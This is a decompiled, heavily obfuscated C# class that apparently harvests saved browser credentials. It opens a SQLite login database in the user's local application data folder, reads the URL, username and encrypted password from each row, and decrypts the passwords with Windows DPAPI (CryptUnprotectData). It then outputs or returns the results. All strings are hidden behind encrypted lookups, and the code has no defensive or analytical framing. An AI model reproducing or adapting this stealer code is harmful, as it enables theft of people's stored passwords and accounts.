using System;
using System.Runtime.InteropServices;
using SQLiteHandler;

internal class Class27
{
	[Flags]
	private enum Enum5
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct4
	{
		public int int_0;

		public Enum5 enum5_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct5
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static void smethod_0(string string_0)
	{
		if (Delegate175.smethod_0(string_0))
		{
			string_0 = (string)_003CModule_003E.smethod_0(4092957181u);
		}
		string string_ = Delegate71.smethod_0(Delegate344.smethod_0(Environment.SpecialFolder.LocalApplicationData), (string)_003CModule_003E.smethod_0(4092957161u));
		try
		{
			global::SQLiteHandler.SQLiteHandler object_ = Delegate345.smethod_0(string_);
			Delegate346.smethod_0(object_, (string)_003CModule_003E.smethod_0(4092957113u));
			if (!Delegate175.smethod_1(string_))
			{
				return;
			}
			for (int i = 0; i <= Delegate348.smethod_0(object_) - 1; i++)
			{
				try
				{
					string text = Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(4092957090u));
					string text2 = Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(4092957011u));
					string text3 = Delegate102.smethod_2(Delegate101.smethod_0(Delegate100.smethod_1(), Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(4092956996u))));
					if (Delegate63.smethod_0(text2, "") && Delegate63.smethod_0(text3, "") && Delegate63.smethod_0(text3, (string)_003CModule_003E.smethod_0(4092957049u)) && (Delegate60.smethod_0(text, string_0) || Delegate63.smethod_1(string_0, (string)_003CModule_003E.smethod_0(4092957181u))))
					{
						Delegate64.smethod_3(Delegate80.smethod_0(new string[6]
						{
							(string)_003CModule_003E.smethod_0(4092957024u),
							Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4092953102u), text)),
							(string)_003CModule_003E.smethod_0(4092953140u),
							Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4092953102u), text2)),
							(string)_003CModule_003E.smethod_0(4092956617u),
							Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4092953102u), text3))
						}), Delegate70.smethod_4());
					}
					Delegate82.smethod_2(100);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static string smethod_1(string string_0)
	{
		if (Delegate175.smethod_0(string_0))
		{
			string_0 = (string)_003CModule_003E.smethod_0(1866395287u);
		}
		string string_ = Delegate71.smethod_0(Delegate344.smethod_0(Environment.SpecialFolder.LocalApplicationData), (string)_003CModule_003E.smethod_0(1866395267u));
		try
		{
			global::SQLiteHandler.SQLiteHandler object_ = Delegate345.smethod_0(string_);
			Delegate346.smethod_0(object_, (string)_003CModule_003E.smethod_0(1866395347u));
			if (Delegate175.smethod_1(string_))
			{
				for (int i = 0; i <= Delegate348.smethod_0(object_) - 1; i++)
				{
					try
					{
						string object_2 = Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(1866395336u));
						string string_2 = Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(1866395193u));
						string text = Delegate102.smethod_2(Delegate101.smethod_0(Delegate100.smethod_1(), Delegate347.smethod_0(object_, i, (string)_003CModule_003E.smethod_0(1866395182u))));
						if (Delegate63.smethod_0(string_2, "") && Delegate63.smethod_0(text, "") && Delegate63.smethod_0(text, (string)_003CModule_003E.smethod_0(1866395155u)) && (Delegate60.smethod_0(object_2, string_0) || Delegate63.smethod_1(string_0, (string)_003CModule_003E.smethod_0(1866395287u))))
						{
							return Delegate72.smethod_0(string_2, (string)_003CModule_003E.smethod_0(1866398990u), text);
						}
					}
					catch
					{
						return "";
					}
				}
			}
		}
		catch
		{
			return "";
		}
		return "";
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct5 struct5_0, string string_0, ref Struct5 struct5_1, IntPtr intptr_0, ref Struct4 struct4_0, int int_0, ref Struct5 struct5_2);

	private static string smethod_2(byte[] byte_0)
	{
		Struct5 struct5_ = default(Struct5);
		Struct5 struct5_2 = default(Struct5);
		GCHandle gCHandle = Delegate349.smethod_0(byte_0, GCHandleType.Pinned);
		struct5_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct5_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct5 struct5_3 = default(Struct5);
		Struct4 struct4_ = default(Struct4);
		Delegate350.smethod_0(ref struct5_, null, ref struct5_3, IntPtr.Zero, ref struct4_, 0, ref struct5_2);
		byte[] byte_ = new byte[struct5_2.int_0 + 1];
		Delegate351.smethod_0(struct5_2.intptr_0, byte_, 0, struct5_2.int_0);
		string object_ = Delegate105.smethod_0(Delegate100.smethod_1(), byte_);
		return Delegate89.smethod_0(object_, 0, Delegate88.smethod_0(object_) - 1);
	}
}
